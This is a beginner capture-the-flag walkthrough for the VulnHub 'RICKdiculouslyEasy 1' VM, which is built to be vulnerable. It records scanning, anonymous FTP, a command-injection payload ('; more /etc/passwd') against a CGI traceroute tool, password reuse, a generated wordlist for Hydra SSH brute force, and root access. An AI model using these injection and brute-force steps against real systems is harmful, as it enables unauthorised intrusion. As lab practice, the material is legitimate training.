## RICKdiculouslyEasy 1 VulnHub VM walkthrough

RICKdiculouslyEasy 1 by https://twitter.com/sayli_ambure

Link: https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/

```
This is a fedora server vm, created with virtualbox.
It is a very simple Rick and Morty themed boot to root.
There are 130 points worth of flags available (each flag has its points recorded with it), you should also get root.
It's designed to be a beginner ctf, if you're new to pen testing, check it out!
```

## Solution

#### 1. Sudo Netdiscover
![](Assets/1.PNG)
> IP address: 192.168.1.10

#### 2. Port scan: Nmap -sC -sV -Pn -A -p- 192.168.1.10
![](Assets/2.PNG)
![](Assets/2.1.PNG)
> 21 -> ftp -> vsftpd 3.0.3 -> anonymous

> 22 -> ssh

> 80 -> Apache httpd 2.4.27

> 9090 -> Cockpit webservice
  
> 13337 -> unknown
  
> flag (10 pt) => total 10 points
  
> 22222 -> ssh -> OpenSSH 7.5 (protocol 2.0)
  
> 60000 > unknown

#### 3. Nikto: Nikto -h 192.168.1.10
![](Assets/3.PNG)
> Passwords/ directory

> Icons/ directory

#### 4. Browser > http://192.168.1.10/passwords/
![](Assets/04.PNG)
> FLAG.txt

> passwords.html

#### 5. Browser > http://192.168.1.10/passwords/FLAG.txt
![](Assets/4.PNG)
> Got Flag (10 pt) = total points 20

#### 6. Browser > http://192.168.1.10/passwords.html page source code
![](Assets/6.PNG)
> password -> winter

#### 7. Browser > http://192.168.1.10/icons/
![](Assets/7.PNG)
> nothing special other than directory listing

#### 8. Browser > http://192.168.1.10/robots.txt
![](Assets/11.PNG)
> /cgi-bin/root_shell.cgi

> /cgi-bin/tracertool.cgi

#### 9. Browser > view-source:http://192.168.1.10/cgi-bin/root_shell.cgi
![](Assets/12.PNG)
> nothing useful

#### 10. Browser > http://192.168.1.10/cgi-bin/tracertool.cgi
![](Assets/13.PNG)
![](Assets/14.PNG)
> Vulnerable to command injection
![](Assets/15.PNG)
> cat command doesn't work. Can use 'more', 'less','head' or 'tail' instead

#### 11. Payload > ; more /etc/passwd
![](Assets/16.PNG)
> Note users 'morty', 'ricksanchez' and 'summer'

#### 12. Ftp 192.168.1.10 > anonymous:anonymous 
![](Assets/8.PNG)
> logged in
![](Assets/9.PNG)
> ftp://192.168.1.10 -> Flag.txt (10 pt) => total 30 points

#### 13. ssh 192.168.1.10 22
![](Assets/17.PNG)
> Not accessible

#### 14. Browser > http://192.168.1.10:9090
![](Assets/18.PNG)
> Got flag (10 pt) => total 40 points

#### 15. Try winter password for users found in step 11 via SSH on 22222 port
![](Assets/19.PNG)
> Didn't work

![](Assets/20.PNG)
> Worked for user 'Summer'

> Got flag (10 pt) => total 50 points
![](Assets/21.PNG)
> password for unzipping journal.txt.zip is in safe_password.jpg
![](Assets/22.PNG)
> Pull jpg file in host machine
![](Assets/23.PNG)
> Got safe password
![](Assets/24.PNG)
> Got Flag (20 pt) => total 70 points
![](Assets/25.PNG)
![](Assets/26.PNG)
> Used flag in journal.txt as argument for safe

> Got next flag (20 pt) => total 90 points

> Got Pattern for RickSanchez password

#### 16. Create python script for all possible password combinations using the clue to feed Hydra:
```
def main():
    LETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    DIGITS = '0123456789'
    BAND_WORDS = ['The', 'Flesh', 'Curtains']
    with open('rickpwd.txt', 'w') as f:
        for letter in LETTERS:
            for digit in DIGITS:
                for word in BAND_WORDS:
                    f.write('{}{}{}\n'.format(letter, digit, word))
        f.flush()
if __name__ == '__main__':
    main()
```
> rickpwd.txt created

#### 17. Hydra -l RickSanchez -P rickpwd.txt 192.168.1.10 ssh -s 22222
![](Assets/27.PNG)
> Password for RickSanchez user > P7Curtains

#### 18. ssh RickSanchez@192.168.1.10 -p 22222
![](Assets/28.PNG)
![](Assets/29.PNG)
> Got root and Flag (30 pt) => total 120 points

#### 19. Analyzing remaining ports: telnet 192.168.1.10 13337
![](Assets/30.PNG)
> Flag already found

#### 20. nc 192.168.1.10 60000
![](Assets/31.PNG)
> Got Flag (10 pt) => total 130 points

> Got all 130/130 points and owned root.
